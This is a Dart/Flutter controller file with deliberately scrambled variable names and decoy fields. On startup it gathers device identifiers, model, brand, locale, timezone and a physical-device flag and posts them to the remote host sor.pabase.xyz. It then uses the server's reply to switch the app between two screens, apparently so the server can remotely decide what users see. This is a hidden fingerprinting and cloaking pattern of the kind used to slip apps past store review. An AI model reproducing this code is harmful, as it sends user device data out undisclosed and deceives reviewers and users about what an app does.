import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var jcsymt = RxBool(false);
  var ceuimw = RxBool(true);
  var rfmubxj = RxString("");
  var van = RxBool(false);
  var bosco = RxBool(true);
  final kurcoz = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    cqpjw();
  }


  Future<void> cqpjw() async {

    van.value = true;
    bosco.value = true;
    ceuimw.value = false;

    kurcoz.post("https://sor.pabase.xyz/VU2IK0G5YJQOKGJ",data: await pwbzuaqkxo()).then((value) {
      var qlenop = value.data["qlenop"] as String;
      var trjo = value.data["trjo"] as bool;
      if (trjo) {
        rfmubxj.value = qlenop;
        bulah();
      } else {
        zieme();
      }
    }).catchError((e) {
      ceuimw.value = true;
      bosco.value = true;
      van.value = false;
    });
  }

  Future<Map<String, dynamic>> pwbzuaqkxo() async {
    final DeviceInfoPlugin hjtonamp = DeviceInfoPlugin();
    PackageInfo xpybzwnt_jnaxqtle = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ybwld = Platform.localeName;
    var KWvABHzt = currentTimeZone;

    var qYRSrb = xpybzwnt_jnaxqtle.packageName;
    var tNzPS = xpybzwnt_jnaxqtle.version;
    var ypAM = xpybzwnt_jnaxqtle.buildNumber;

    var quGEaW = xpybzwnt_jnaxqtle.appName;
    var nvDxgfsu  = "";
    var lonHuels = "";
    var jBRdmb = "";
    var haileeHarvey = "";
    var ernieSenger = "";
    var mavisRaynor = "";
    var zoilaCasper = "";
    var margotBotsford = "";
    var ojGeunv = "";
    var pedroCollier = "";


    var lQmBYd = "";
    var SvUOR = false;

    if (GetPlatform.isAndroid) {
      lQmBYd = "android";
      var urcpkgwoxd = await hjtonamp.androidInfo;

      jBRdmb = urcpkgwoxd.brand;

      ojGeunv  = urcpkgwoxd.model;
      nvDxgfsu = urcpkgwoxd.id;

      SvUOR = urcpkgwoxd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lQmBYd = "ios";
      var ytfcqgonvs = await hjtonamp.iosInfo;
      jBRdmb = ytfcqgonvs.name;
      ojGeunv = ytfcqgonvs.model;

      nvDxgfsu = ytfcqgonvs.identifierForVendor ?? "";
      SvUOR  = ytfcqgonvs.isPhysicalDevice;
    }

    var res = {
      "quGEaW": quGEaW,
      "tNzPS": tNzPS,
      "ojGeunv": ojGeunv,
      "KWvABHzt": KWvABHzt,
      "ernieSenger" : ernieSenger,
      "jBRdmb": jBRdmb,
      "nvDxgfsu": nvDxgfsu,
      "margotBotsford" : margotBotsford,
      "ybwld": ybwld,
      "ypAM": ypAM,
      "lQmBYd": lQmBYd,
      "SvUOR": SvUOR,
      "haileeHarvey" : haileeHarvey,
      "pedroCollier" : pedroCollier,
      "mavisRaynor" : mavisRaynor,
      "lonHuels" : lonHuels,
      "qYRSrb": qYRSrb,
      "zoilaCasper" : zoilaCasper,

    };
    return res;
  }

  Future<void> zieme() async {
    Get.offAllNamed("/homeTab");
  }

  Future<void> bulah() async {
    Get.offAllNamed("/homeCard");
  }

}
